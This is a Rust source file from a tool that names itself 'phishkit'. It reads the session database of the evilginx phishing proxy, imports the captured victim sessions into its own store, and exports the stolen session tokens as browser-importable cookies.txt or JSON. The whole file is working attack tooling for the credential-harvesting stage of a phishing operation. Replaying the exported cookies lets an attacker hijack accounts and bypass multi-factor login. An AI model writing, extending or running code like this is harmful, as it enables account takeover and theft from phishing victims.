use std::collections::HashMap;
use std::fs;
use std::path::Path;

use serde_json::{json, Value};

use crate::db::{self, CaptureRow};
use crate::error::{AppError, AppResult};
use crate::setup;

fn read_bulk(buf: &[u8], i: usize) -> AppResult<(Vec<u8>, usize)> {
    if i >= buf.len() || buf[i] != b'$' {
        return Err(AppError::msg("buntdb: expected $"));
    }
    let j = buf[i + 1..]
        .iter()
        .position(|&b| b == b'\r')
        .map(|p| i + 1 + p)
        .ok_or_else(|| AppError::msg("buntdb: no CRLF"))?;
    let n: usize = std::str::from_utf8(&buf[i + 1..j])
        .map_err(|_| AppError::msg("buntdb len"))?
        .parse()
        .map_err(|_| AppError::msg("buntdb len parse"))?;
    let start = j + 2;
    let end = start + n;
    if end + 2 > buf.len() || &buf[end..end + 2] != b"\r\n" {
        return Err(AppError::msg("buntdb bulk trailer"));
    }
    Ok((buf[start..end].to_vec(), end + 2))
}

fn iter_commands(path: &Path) -> AppResult<Vec<Vec<Vec<u8>>>> {
    let buf = fs::read(path)?;
    let mut i = 0;
    let mut out = Vec::new();
    while i < buf.len() {
        if buf[i] != b'*' {
            break;
        }
        let j = buf[i + 1..]
            .iter()
            .position(|&b| b == b'\r')
            .map(|p| i + 1 + p)
            .ok_or_else(|| AppError::msg("buntdb argc"))?;
        let argc: usize = std::str::from_utf8(&buf[i + 1..j])
            .unwrap_or("0")
            .parse()
            .unwrap_or(0);
        i = j + 2;
        let mut parts = Vec::new();
        for _ in 0..argc {
            let (v, ni) = read_bulk(&buf, i)?;
            parts.push(v);
            i = ni;
        }
        out.push(parts);
    }
    Ok(out)
}

pub fn latest_sessions_from_db(path: &Path) -> AppResult<HashMap<i64, Value>> {
    let mut state: HashMap<String, String> = HashMap::new();
    for cmd in iter_commands(path)? {
        if cmd.is_empty() {
            continue;
        }
        let op = String::from_utf8_lossy(&cmd[0]).to_ascii_lowercase();
        if op == "set" && cmd.len() >= 3 {
            let key = String::from_utf8_lossy(&cmd[1]).to_string();
            let val = String::from_utf8_lossy(&cmd[2]).to_string();
            state.insert(key, val);
        } else if op == "del" && cmd.len() >= 2 {
            let key = String::from_utf8_lossy(&cmd[1]).to_string();
            state.remove(&key);
        }
    }
    let mut out = HashMap::new();
    for (key, val) in state {
        if !key.starts_with("sessions:") || key.ends_with(":id") {
            continue;
        }
        if let Ok(rec) = serde_json::from_str::<Value>(&val) {
            if let Some(sid) = rec.get("id").and_then(|v| v.as_i64()) {
                out.insert(sid, rec);
            }
        }
    }
    Ok(out)
}

fn evilginx_db_path() -> AppResult<std::path::PathBuf> {
    let primary = setup::evilginx_data_dir()?.join("data.db");
    if primary.is_file() {
        return Ok(primary);
    }
    // Legacy kit-tree location (pre OS data dir).
    if let Ok(root) = crate::kit::kit_root() {
        let legacy = root.join("kit/evilginx/run/data/data.db");
        if legacy.is_file() {
            return Ok(legacy);
        }
    }
    Err(AppError::msg(format!(
        "evilginx DB not found at {} — start evilginx first",
        primary.display()
    )))
}

pub fn sync_captures(profile_id: String) -> AppResult<Vec<CaptureRow>> {
    let path = evilginx_db_path()?;
    let sessions = latest_sessions_from_db(&path)?;
    for (sid, rec) in &sessions {
        let create = rec.get("create_time").and_then(|v| v.as_i64());
        let update = rec.get("update_time").and_then(|v| v.as_i64());
        db::upsert_capture(&profile_id, *sid, rec, create, update)?;
    }
    db::list_captures(&profile_id)
}

pub fn list_captures(profile_id: String) -> AppResult<Vec<CaptureRow>> {
    db::list_captures(&profile_id)
}

pub fn delete_capture(profile_id: String, evilginx_session_id: i64) -> AppResult<()> {
    db::ignore_and_delete_capture(&profile_id, evilginx_session_id)
}

pub fn prune_captures(profile_id: String) -> AppResult<serde_json::Value> {
    let n = db::prune_empty_captures(&profile_id)?;
    Ok(json!({"pruned": n}))
}

/// Export evilginx `tokens` map as Netscape cookies.txt or JSON.
pub fn export_capture_cookies(
    profile_id: String,
    evilginx_session_id: i64,
    format: String,
) -> AppResult<String> {
    let rows = db::list_captures(&profile_id)?;
    let row = rows
        .into_iter()
        .find(|c| c.evilginx_session_id == evilginx_session_id)
        .ok_or_else(|| AppError::msg("capture not found"))?;
    let tokens = row.data.get("tokens").cloned().unwrap_or(json!({}));
    let fmt = format.trim().to_ascii_lowercase();
    if fmt == "json" || fmt.is_empty() {
        return Ok(serde_json::to_string_pretty(&tokens)?);
    }
    if fmt != "netscape" {
        return Err(AppError::msg("format must be json or netscape"));
    }
    // tokens: { "domain.com": { "name": { "value": "...", "path": "/", ... }, ... }, ... }
    let mut out = String::from("# Netscape HTTP Cookie File\n# Generated by phishkit\n");
    if let Some(domains) = tokens.as_object() {
        for (domain, cookies) in domains {
            let host = domain.trim_start_matches('.');
            let include_sub = domain.starts_with('.');
            if let Some(map) = cookies.as_object() {
                for (name, meta) in map {
                    let (value, path, secure, expires) = if let Some(obj) = meta.as_object() {
                        let value = obj
                            .get("Value")
                            .or_else(|| obj.get("value"))
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string();
                        let path = obj
                            .get("Path")
                            .or_else(|| obj.get("path"))
                            .and_then(|v| v.as_str())
                            .unwrap_or("/")
                            .to_string();
                        let secure = obj
                            .get("Secure")
                            .or_else(|| obj.get("secure"))
                            .and_then(|v| v.as_bool())
                            .unwrap_or(true);
                        let expires = obj
                            .get("Expires")
                            .or_else(|| obj.get("expires"))
                            .and_then(|v| v.as_i64())
                            .unwrap_or(0);
                        (value, path, secure, expires)
                    } else if let Some(s) = meta.as_str() {
                        (s.to_string(), "/".into(), true, 0i64)
                    } else {
                        continue;
                    };
                    if value.is_empty() {
                        continue;
                    }
                    out.push_str(&format!(
                        "{}\t{}\t{}\t{}\t{}\t{}\t{}\n",
                        if include_sub {
                            domain.clone()
                        } else {
                            host.to_string()
                        },
                        if include_sub { "TRUE" } else { "FALSE" },
                        path,
                        if secure { "TRUE" } else { "FALSE" },
                        expires,
                        name,
                        value
                    ));
                }
            }
        }
    }
    Ok(out)
}
